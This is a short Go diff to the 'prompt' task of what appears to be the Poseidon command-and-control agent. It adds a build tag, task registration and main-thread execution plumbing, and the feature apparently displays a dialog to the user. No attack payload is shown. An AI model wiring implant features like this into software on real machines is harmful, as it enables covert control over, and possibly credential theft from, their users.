@@ -1,9 +1,22 @@
+//go:build prompt || debug
+
 package prompt
 
 import (
 	"encoding/json"
+
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/runtimeMainThread"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func runWrapper(task structs.Task) {
+	runtimeMainThread.DoOnMainThread(Run, task)
+}
+
+func init() {
+	taskRegistrar.Register("prompt", runWrapper)
+}
 
 type Arguments struct {
 	Icon        string
